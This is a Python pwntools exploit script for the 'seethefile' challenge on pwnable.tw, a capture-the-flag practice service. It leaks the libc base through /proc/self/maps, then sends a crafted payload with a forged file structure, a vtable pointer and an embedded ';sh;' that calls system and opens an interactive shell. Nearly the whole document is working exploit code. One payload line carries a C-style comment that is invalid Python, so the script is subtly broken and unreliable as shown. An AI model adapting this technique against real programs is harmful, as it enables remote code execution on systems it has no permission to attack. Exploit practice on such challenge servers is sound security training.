from pwn import *
#io = remote('127.0.0.1',4000)
io = remote('chall.pwnable.tw',10200)

def openfile(name):
    io.recvuntil('choice :')
    io.sendline('1')
    io.recvuntil('see :')
    io.sendline(name)

def readfile():
    io.recvuntil('choice :')
    io.sendline('2')

def writefile():
    io.recvuntil('choice :')
    io.sendline('3')

openfile('/proc/self/maps')

readfile()
readfile()
writefile()
io.recvline()

libc_base = int(io.recvuntil('-')[:-1],16)
print('libc base: ' + hex(libc_base))

#one_gadget = libc_base + 0x5fbc5
system = libc_base + 0x3a940
payload = 'A'*0x20 + p32(0x804b284) + 'aaaa;sh;' + cyclic(64) + p32(0x804b500) + p32(0x804b324-0x40) // _vtable_offset
payload += 'A'*80 + p32(system)

io.recvuntil('choice :')
io.sendline('5')
io.recvuntil('name :')
#raw_input()
io.sendline(payload)


io.interactive()
